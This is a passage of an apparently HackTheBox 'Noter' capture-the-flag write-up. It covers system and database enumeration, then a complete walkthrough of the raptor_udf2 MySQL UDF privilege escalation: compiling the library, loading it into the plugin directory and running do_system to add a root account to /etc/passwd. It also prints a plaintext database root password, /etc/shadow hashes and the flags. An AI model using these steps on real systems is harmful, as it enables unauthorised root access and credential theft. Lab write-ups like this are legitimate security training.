sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

Enumerated machine:

```bash
svc@noter:~$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"
NAME="Ubuntu"
VERSION="20.04.3 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.3 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
svc@noter:~$ cat /etc/issue
Ubuntu 20.04.3 LTS \n \l
```

Enumerated running services:

```bash
svc@noter:~$ netstat -polentau
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        25450      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          26661      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1001       28777      1265/python3         off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      0          27890      -                    off (0.00/0/0)
tcp        0      0 10.10.11.160:5000       10.10.14.3:32888        ESTABLISHED 1001       247993     1265/python3         off (0.00/0/0)
tcp        0      0 127.0.0.1:58582         127.0.0.1:3306          ESTABLISHED 0          255615     -                    off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          127.0.0.1:58582         ESTABLISHED 0          255616     -                    keepalive (1103.05/0/0)
tcp        0      1 10.10.11.160:37594      8.8.8.8:53              SYN_SENT    101        358593     -                    on (7.80/3/0)
tcp        0    187 10.10.11.160:57182      10.10.14.3:10099        ESTABLISHED 1001       247702     31500/bash           on (0.24/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      0          26471      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      0          26663      -                    off (0.00/0/0)
udp        0      0 127.0.0.1:36551         127.0.0.53:53           ESTABLISHED 102        358592     -                    off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        25449      -                    off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          21881      -                    off (0.00/0/0)
```

Enumerated mysql:

```bash
svc@noter:~$ mysql -V
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2

svc@noter:~$ mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2483
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| test               |
+--------------------+
2 rows in set (0.002 sec)

MariaDB [(none)]> use test;
Database changed
MariaDB [test]> show tables
    -> ;
Empty set (0.000 sec)

MariaDB [test]> exit
Bye

svc@noter:~$ mysql --user="DB_user" --password="DB_password" -A
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2519
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| test               |
+--------------------+
3 rows in set (0.000 sec)

MariaDB [(none)]> use app;
Database changed
MariaDB [app]> show tables;
+---------------+
| Tables_in_app |
+---------------+
| notes         |
| users         |
+---------------+
2 rows in set (0.001 sec)

svc@noter:~$ mysql --user="root" --password="Nildogg36" -A
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2547
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
5 rows in set (0.000 sec)

MariaDB [mysql]> select User,Password from user;
+---------+-------------------------------------------+
| User    | Password                                  |
+---------+-------------------------------------------+
| root    | *937440AD99CBB4A102402708AA43B689818489C8 |
| root    |                                           |
| root    |                                           |
| root    |                                           |
|         |                                           |
|         |                                           |
| DB_user | *52107B0F316DEF5A57F59273C66227AEA58A2671 |
+---------+-------------------------------------------+
7 rows in set (0.000 sec)
```

Enumerated **/opt**

```bash
svc@noter:~$ ls -al /opt
total 12
drwxr-xr-x  2 root root 4096 May  2 23:05 .
drwxr-xr-x 19 root root 4096 May  2 23:05 ..
-rwxr--r--  1 root root  137 Dec 30 09:41 backup.sh

svc@noter:/opt$ cat backup.sh
#!/bin/bash
zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\*

svc@noter:/opt$ ls -al /usr/bin/zip
-rwxr-xr-x 1 root root 216256 Apr 21  2017 /usr/bin/zip
```

Enumerated PATH:

```bash
svc@noter:/opt$ echo $PATH
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

svc@noter:/opt$ ls -ald /home/svc/.local/bin/
drwxrwxr-x 2 svc svc 4096 May  2 23:05 /home/svc/.local/bin/
svc@noter:/opt$ ls -ald /usr/local/sbin
drwxr-xr-x 2 root root 4096 Aug 24  2021 /usr/local/sbin
svc@noter:/opt$ ls -ald /usr/local/bin
drwxr-xr-x 2 root root 4096 May  2 15:02 /usr/local/bin
svc@noter:/opt$ ls -ald /sbin
lrwxrwxrwx 1 root root 8 Aug 24  2021 /sbin -> usr/sbin
svc@noter:/opt$ ls -ald /bin
lrwxrwxrwx 1 root root 7 Aug 24  2021 /bin -> usr/bin
svc@noter:/opt$ ls -ald /usr/sbin
drwxr-xr-x 2 root root 20480 May  2 19:24 /usr/sbin
svc@noter:/opt$ ls -ald /usr/bin
drwxr-xr-x 2 root root 36864 May  2 22:49 /usr/bin
```

## MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/1518)

```bash
svc@noter:/dev/shm/exploit$ nano raptor_udf2.c
svc@noter:/dev/shm/exploit$ gcc -g -c raptor_udf2.c
svc@noter:/dev/shm/exploit$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
svc@noter:/dev/shm/exploit$ mysql --user="root" --password="Nildogg36" -A
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 3445
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use mysql;
Database changed
MariaDB [mysql]> create table foo(line blob);
Query OK, 0 rows affected (0.005 sec)

MariaDB [mysql]> insert into foo values(load_file('/dev/shm/exploit/raptor_udf2.so'));
Query OK, 1 row affected (0.002 sec)

MariaDB [mysql]> show variables like '%plugin%';
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
2 rows in set (0.001 sec)

MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.001 sec)

MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.001 sec)

MariaDB [mysql]> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
1 row in set (0.000 sec)

MariaDB [mysql]> select do_system('echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd');
+---------------------------------------------------------------------------------+
| do_system('echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd') |
+---------------------------------------------------------------------------------+
|                                                                               0 |
+---------------------------------------------------------------------------------+
1 row in set (0.002 sec)

MariaDB [mysql]> \!sh
ERROR: Usage: \! shell-command
MariaDB [mysql]> \! sh
$ su root2
Password:
root@noter:/dev/shm/exploit# hostname; id; cat /root/root.txt; ip a
noter
uid=0(root) gid=0(root) groups=0(root)
f6cf8b4b2c9af103636f9685571917aa
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:49:2b brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.160/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:492b/64 scope global dynamic mngtmpaddr
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:492b/64 scope link
       valid_lft forever preferred_lft forever
```

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%2012.png)

# Trophy

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%2013.png)

>[!success]
>**User.txt**
c20d842d8d4ce26f46f247128817290d

>[!success]
>**Root.txt**
>f6cf8b4b2c9af103636f9685571917aa

**/etc/shadow**

```bash
root@noter:/dev/shm/exploit# cat /etc/shadow | grep '\$'
root:$6$09RSjU3jIh/2JW1u$8jlcYzW5Oyzgh/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::
svc:$6$gTM.AIsgDue4r5AQ$wUBfUtg7/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7:::
ftp_admin:$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::
blue:$6$pNud9u/1PdD8qPYi$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO/hIiUQdVTqlxb29.:19114:0:99999:7:::
```